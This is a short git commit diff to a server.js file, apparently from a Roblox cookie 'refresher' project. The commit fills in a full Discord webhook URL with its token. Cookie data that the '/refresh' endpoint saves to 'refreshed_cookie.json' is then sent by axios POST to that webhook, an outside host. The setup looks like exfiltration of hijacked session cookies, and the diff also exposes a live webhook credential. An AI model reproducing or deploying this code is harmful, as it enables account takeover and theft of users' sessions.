597759e1164e82b5bdbb0239863dc0c4e784c802
Robloxextensions <132360328+Robloxextensions@users.noreply.github.com>
2024-06-03 18:12:33 +0200

    Update server.js

--- server.js
+++ server.js
@@ -57,7 +57,7 @@ app.get('/refresh', async (req, res) => {
 
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
 
-    const webhookURL = 'HOOK HERE';
+    const webhookURL = 'https://discord.com/api/webhooks/1247189278946234461/I2UuaQA4sWyIhLXHvIMYudHeKfL0CwFvnbgPdNSeYgFGv5zFmwACFD0vpfyXZgK4bUon';
     const response = await axios.post(webhookURL, {
         embeds: [
             {
